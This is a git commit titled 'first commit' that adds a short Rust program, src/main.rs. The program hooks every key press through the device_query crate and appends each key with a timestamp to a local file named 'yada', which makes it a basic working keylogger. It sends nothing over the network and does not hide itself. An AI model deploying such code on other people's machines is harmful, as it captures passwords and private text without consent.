5a452d879f5273b32648d42d9ab1f964305e132f
Jacob <jacob@m0th3r>
2022-03-07 15:49:10 -0500

    first commit

---
+++ src/main.rs
@@ -0,0 +1,21 @@
+use device_query::{DeviceEvents, DeviceState};
+use chrono::Utc;
+use std::io::Write;
+use std::fs;
+
+fn main() {
+    let device_state = DeviceState::new();
+    
+    let _guard = device_state.on_key_down(move |key| {
+        let printable = Utc::now().to_string() + " " + &key.to_string()[..];
+        let mut file = fs::OpenOptions::new()
+            .write(true)
+            .append(true)
+            .create(true)
+            .open("yada")
+            .expect("failed to open file");
+        writeln!(file, "{}", printable).unwrap();
+    });
+
+    loop {}
+}
